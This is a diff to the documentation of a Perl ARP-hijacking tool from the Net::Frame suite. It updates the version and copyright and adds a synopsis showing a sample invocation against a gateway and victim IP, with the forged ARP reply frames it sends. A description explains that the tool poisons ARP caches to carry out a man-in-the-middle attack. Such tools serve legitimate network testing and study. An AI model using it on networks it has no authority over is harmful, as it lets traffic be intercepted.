@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 #
-# $Id: nf-arphijack.pl,v 1.5 2006/12/17 17:08:17 gomor Exp $
+# $Id: nf-arphijack.pl,v 1.6 2007/04/02 16:45:17 gomor Exp $
 #
 use strict;
 use warnings;
@@ -97,13 +97,34 @@ __END__
 
 nf-arphijack - Net::Frame ARP Hi-Jack tool
 
+=head1 SYNOPSIS
+
+   # nf-arphijack.pl -g 192.168.0.1 -v 192.168.0.69
+   Gateway: IP=192.168.0.1 - MAC=00:0c:29:aa:bb:cc
+   Victim : IP=192.168.0.69 - MAC=00:13:d4:aa:bb:cc
+   ETH: dst:00:13:d4:aa:bb:cc  src:00:13:a9:aa:bb:cc  type:0x0806
+   ARP: hType:0x0001  pType:0x0800  hSize:0x06  pSize:0x04  opCode:0x0002
+   ARP: src:00:13:a9:aa:bb:cc  srcIp:192.168.0.1
+   ARP: dst:00:13:d4:aa:bb:cc  dstIp:192.168.0.69
+   ETH: dst:00:0c:29:aa:bb:cc  src:00:13:a9:aa:bb:cc  type:0x0806
+   ARP: hType:0x0001  pType:0x0800  hSize:0x06  pSize:0x04  opCode:0x0002
+   ARP: src:00:13:a9:aa:bb:cc  srcIp:192.168.0.69
+   ARP: dst:00:0c:29:aa:bb:cc  dstIp:192.168.0.1
+   ..
+
+=head1 DESCRIPTION
+
+This tool implements an ARP man-in-the-middle attack, by poisoning the ARP cache table of a gateway (or other IP address on same subnet) and a victim IP address.
+
+The traffic will then be redirected to attacker's IP address, in both directions. So, be sure to enable router capability on your system.
+
 =head1 AUTHOR
 
 Patrice E<lt>GomoRE<gt> Auffret
 
 =head1 COPYRIGHT AND LICENSE
 
-Copyright (c) 2006, Patrice E<lt>GomoRE<gt> Auffret
+Copyright (c) 2006-2007, Patrice E<lt>GomoRE<gt> Auffret
 
 You may distribute this module under the terms of the Artistic license.
 See LICENSE.Artistic file in the source distribution archive.
